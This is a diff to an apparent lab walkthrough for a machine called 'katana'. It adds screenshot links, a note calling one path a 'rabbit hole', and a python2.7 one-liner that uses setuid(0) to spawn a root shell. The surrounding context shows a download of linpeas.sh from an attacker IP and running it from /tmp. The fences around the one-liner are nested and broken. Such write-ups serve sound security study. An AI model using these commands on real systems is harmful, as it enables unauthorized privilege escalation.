@@ -373,6 +373,9 @@ INSERT INTO `admin` (`name`, `pass`) VALUES
 
 ![](../../../assets/images/Pasted%20image%2020260520045607.png)
 
+*This is a rabbit hole*
+
+
 ```zsh
 www-data@katana:~/html/ebook/database$ wwget http://192.168.45.160/linpeas.sh -O /tmp/linpeas.sh
 <http://192.168.45.160/linpeas.sh -O /tmp/linpeas.sh
@@ -398,7 +401,14 @@ www-data@katana:~/html/ebook/database$ /tmp/linpeas.sh
 
 ![](../../../assets/images/Pasted%20image%2020260520050035.png)
 
+![](../../../assets/images/Pasted%20image%2020260520054706.png)
+
+![](../../../assets/images/Pasted%20image%2020260520055439.png)
+
 ```zsh
+```bash
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+```
 
 ```
 
